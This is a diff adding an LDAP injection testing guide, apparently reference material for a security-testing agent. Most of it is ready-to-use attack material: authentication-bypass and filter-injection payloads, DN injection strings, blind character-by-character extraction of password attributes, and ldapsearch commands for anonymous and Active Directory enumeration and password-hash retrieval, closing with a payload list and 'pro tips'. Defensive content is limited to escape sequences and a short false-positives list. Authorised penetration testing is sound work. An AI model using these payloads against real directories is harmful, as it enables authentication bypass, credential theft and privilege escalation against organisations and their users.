@@ -1,0 +1,381 @@
+<ldap_security_guide>
+<title>LDAP INJECTION AND SECURITY TESTING</title>
+
+<critical>LDAP (Lightweight Directory Access Protocol) is used for directory services, authentication, and authorization. LDAP injection allows attackers to modify queries, bypass authentication, extract data, and escalate privileges. Many applications using LDAP for authentication are vulnerable to injection attacks.</critical>
+
+<scope>
+- LDAP injection in authentication
+- Search filter manipulation
+- Blind LDAP injection
+- DN (Distinguished Name) injection
+- LDAP-based authorization bypass
+- Anonymous binding and enumeration
+- Password policy exploitation
+- LDAP schema exposure
+</scope>
+
+<methodology>
+1. Identify LDAP-backed authentication and search functions.
+2. Test for injection in username, password, and search fields.
+3. Probe for blind injection using response differentials.
+4. Enumerate directory structure through injection.
+5. Test for anonymous binding and information disclosure.
+</methodology>
+
+<ldap_basics>
+<ldap_structure>
+{% raw %}
+# LDAP Distinguished Name (DN) format:
+cn=John Doe,ou=Users,dc=example,dc=com
+
+# Common LDAP attributes:
+cn       # Common Name
+sn       # Surname
+uid      # User ID
+mail     # Email address
+userPassword  # Password
+memberOf     # Group membership
+objectClass  # Object type
+
+# LDAP Filter syntax:
+(cn=John)                    # Equality
+(cn=*John*)                  # Substring
+(&(cn=John)(sn=Doe))         # AND
+(|(cn=John)(cn=Jane))        # OR
+(!(cn=John))                 # NOT
+(cn>=J)                      # Greater than or equal
+(cn=*)                       # Presence (any value)
+{% endraw %}
+</ldap_structure>
+
+<common_queries>
+{% raw %}
+# Authentication query:
+(&(uid=USERNAME)(userPassword=PASSWORD))
+
+# User search:
+(&(objectClass=person)(cn=*SEARCHTERM*))
+
+# Group membership:
+(&(memberOf=cn=admins,ou=groups,dc=example,dc=com)(uid=USERNAME))
+
+# Email lookup:
+(mail=EMAIL)
+{% endraw %}
+</common_queries>
+</ldap_basics>
+
+<ldap_injection>
+<authentication_bypass>
+{% raw %}
+# Vulnerable authentication query:
+(&(uid=USERNAME)(userPassword=PASSWORD))
+
+# Injection payloads for username field:
+*)(uid=*))(|(uid=*           # Always true
+admin)(&)                     # Comment out password check
+admin)(|(password=*          # Bypass password
+*)(&                         # Universal bypass
+
+# Injection in password field:
+*)(&                         # Bypass password check
+anything)(uid=admin))(&       # Force admin match
+
+# Full bypass examples:
+username: admin)(&
+password: anything
+
+username: *)(uid=*))(|(uid=*
+password: anything
+
+# Works because query becomes:
+(&(uid=admin)(&)(userPassword=anything))
+# (&) always evaluates to true
+{% endraw %}
+</authentication_bypass>
+
+<filter_injection>
+{% raw %}
+# Vulnerable search filter:
+(cn=*USERINPUT*)
+
+# Injection payloads:
+*)(objectClass=*             # Retrieve all objects
+*)(userPassword=*            # Find entries with passwords
+*))(|(cn=                    # Close filter, inject new one
+*)(uid=admin                 # Target specific user
+
+# Retrieve all users:
+*)(objectClass=person)(&(cn=*
+
+# Find admin users:
+*)(memberOf=cn=admins,*      # Find group members
+
+# Enumerate attributes:
+*)(userPassword=a*           # Starts with 'a'
+{% endraw %}
+</filter_injection>
+
+<dn_injection>
+{% raw %}
+# DN (Distinguished Name) injection:
+# If DN constructed from user input:
+
+# Vulnerable code:
+dn = f"cn={username},ou=users,dc=example,dc=com"
+
+# Injection:
+username: admin,ou=admins,dc=example,dc=com)#
+# Escapes to admin OU
+
+# DN escape sequences:
+,  -> \,
++  -> \+
+"  -> \"
+\  -> \\
+<  -> \<
+>  -> \>
+;  -> \;
+=  -> \=
+{% endraw %}
+</dn_injection>
+</ldap_injection>
+
+<blind_injection>
+<boolean_based>
+{% raw %}
+# Boolean-based blind LDAP injection:
+
+# Login with injection, observe response difference:
+# True condition (successful login indicator):
+admin)(|(objectClass=*
+# False condition (failed login indicator):
+admin)(!(objectClass=*)
+
+# Attribute enumeration:
+admin)(|(userPassword=a*     # Does password start with 'a'?
+admin)(|(userPassword=b*     # Does password start with 'b'?
+
+# Character-by-character extraction:
+admin)(|(description=S*      # First char 'S'?
+admin)(|(description=Se*     # Second char 'e'?
+{% endraw %}
+</boolean_based>
+
+<error_based>
+{% raw %}
+# Error-based injection:
+# Malformed filter to trigger errors:
+admin)(|(                    # Incomplete filter
+admin))(                     # Extra parenthesis
+
+# Error message may reveal:
+# - LDAP server type
+# - Query structure
+# - Attribute names
+{% endraw %}
+</error_based>
+</blind_injection>
+
+<anonymous_binding>
+<anonymous_access>
+{% raw %}
+# Test anonymous binding:
+ldapsearch -H ldap://target.com -x -b "dc=example,dc=com"
+
+# Anonymous enumeration:
+ldapsearch -H ldap://target.com -x -b "dc=example,dc=com" "(objectClass=*)"
+
+# Find users:
+ldapsearch -H ldap://target.com -x -b "dc=example,dc=com" "(objectClass=person)"
+
+# Find groups:
+ldapsearch -H ldap://target.com -x -b "dc=example,dc=com" "(objectClass=group)"
+
+# Schema discovery:
+ldapsearch -H ldap://target.com -x -s base -b "" "(objectClass=*)" "*" +
+{% endraw %}
+</anonymous_access>
+
+<null_base_dn>
+{% raw %}
+# Query with empty base DN:
+ldapsearch -H ldap://target.com -x -b "" "(objectClass=*)" namingContexts
+
+# Retrieve supported SASL mechanisms:
+ldapsearch -H ldap://target.com -x -b "" -s base "(objectClass=*)" supportedSASLMechanisms
+
+# Retrieve server capabilities:
+ldapsearch -H ldap://target.com -x -b "" -s base "(objectClass=*)" "+"
+{% endraw %}
+</null_base_dn>
+</anonymous_binding>
+
+<password_attacks>
+<password_extraction>
+{% raw %}
+# Extract password hashes (if accessible):
+ldapsearch -H ldap://target.com -x -D "cn=admin,dc=example,dc=com" \
+  -w password -b "dc=example,dc=com" "(objectClass=person)" userPassword
+
+# Common password attributes:
+userPassword
+unicodePwd (Active Directory)
+sambaNTPassword
+sambaLMPassword
+
+# Password hash formats:
+{SSHA}base64...   # Salted SHA
+{SHA}base64...    # SHA1
+{MD5}base64...    # MD5
+{CRYPT}...        # Unix crypt
+{% endraw %}
+</password_extraction>
+
+<password_policy>
+{% raw %}
+# Enumerate password policy:
+ldapsearch -H ldap://target.com -x -b "dc=example,dc=com" \
+  "(objectClass=pwdPolicy)" "*"
+
+# Active Directory password policy:
+ldapsearch -H ldap://dc.example.com -x -D "user@example.com" -w pass \
+  -b "dc=example,dc=com" "(objectClass=domain)" \
+  minPwdLength minPwdAge maxPwdAge pwdHistoryLength lockoutDuration
+{% endraw %}
+</password_policy>
+</password_attacks>
+
+<active_directory>
+<ad_enumeration>
+{% raw %}
+# Active Directory LDAP enumeration:
+
+# Enumerate domain:
+ldapsearch -H ldap://dc.example.com -x -D "user@example.com" -w pass \
+  -b "dc=example,dc=com" "(objectClass=domain)"
+
+# Enumerate users:
+ldapsearch -H ldap://dc.example.com -x -D "user@example.com" -w pass \
+  -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName
+
+# Enumerate groups:
+ldapsearch -H ldap://dc.example.com -x -D "user@example.com" -w pass \
+  -b "dc=example,dc=com" "(objectClass=group)" cn member
+
+# Find domain admins:
+ldapsearch -H ldap://dc.example.com -x -D "user@example.com" -w pass \
+  -b "dc=example,dc=com" "(&(objectClass=group)(cn=Domain Admins))" member
+{% endraw %}
+</ad_enumeration>
+
+<ad_injection>
+{% raw %}
+# Active Directory specific injection:
+
+# sAMAccountName injection:
+admin*              # Wildcard matching
+admin)(objectClass=*  # Filter injection
+
+# UPN (User Principal Name) injection:
+user@*              # Domain wildcard
+user@domain.com)(objectClass=*
+{% endraw %}
+</ad_injection>
+</active_directory>
+
+<exploitation_techniques>
+<attribute_enumeration>
+{% raw %}
+# Enumerate attributes via injection:
+*)(description=*       # Find entries with description
+*)(telephoneNumber=*   # Find entries with phone
+*)(mail=*              # Find entries with email
+
+# Blind attribute extraction:
+# Character by character:
+*)(mail=a*             # Email starts with 'a'?
+*)(mail=admin*         # Email starts with 'admin'?
+*)(mail=admin@*        # Continue extraction
+{% endraw %}
+</attribute_enumeration>
+
+<group_membership>
+{% raw %}
+# Enumerate group membership:
+*)(memberOf=*          # Users in any group
+*)(memberOf=cn=admin*  # Users in admin groups
+
+# Escalate via group injection:
+# If group membership check is vulnerable:
+(&(uid=user)(memberOf=GROUP))
+# Inject: user)(|(memberOf=cn=admins,*
+{% endraw %}
+</group_membership>
+</exploitation_techniques>
+
+<common_payloads>
+{% raw %}
+# Authentication bypass:
+*)(&
+*)(uid=*))(|(uid=*
+admin)(|(&
+admin)(!(&(1=0
+
+# Filter injection:
+*)(objectClass=*
+*)(|(password=*
+*)(cn=admin
+*))(&(
+
+# DN injection:
+admin,ou=admins,dc=example,dc=com)#
+admin\00
+admin\\00
+
+# Blind extraction:
+*)(password=a*
+*)(password=b*
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate authentication bypass with LDAP injection.
+2. Show data extraction through filter injection.
+3. Prove blind injection with differential responses.
+4. Document anonymous binding information disclosure.
+5. Provide evidence of DN injection or attribute enumeration.
+</validation>
+
+<false_positives>
+- Proper input escaping for LDAP special characters
+- Parameterized LDAP queries
+- Anonymous binding disabled
+- Attribute-level access control
+- Password attributes not readable
+</false_positives>
+
+<impact>
+- Authentication bypass
+- Unauthorized data access
+- Privilege escalation via group manipulation
+- Directory structure exposure
+- Password hash extraction
+- Complete directory compromise
+</impact>
+
+<pro_tips>
+1. Always test username AND password fields for injection.
+2. *)(objectClass=* is a universal filter injection test.
+3. Anonymous binding is often enabled by default.
+4. Active Directory uses specific attributes (sAMAccountName).
+5. Blind injection requires patience - character by character.
+6. DN injection is less common but equally dangerous.
+7. LDAPS (port 636) may have different access controls.
+8. Schema exposure helps craft more effective injections.
+9. Group membership checks are often vulnerable.
+10. Error messages reveal query structure and server type.
+</pro_tips>
+
+<remember>LDAP injection exploits insufficient input sanitization in directory queries. Authentication systems are prime targets where username or password fields may be injected. Always test both filter injection and DN injection, and probe for anonymous access which reveals directory structure.</remember>
+</ldap_security_guide>
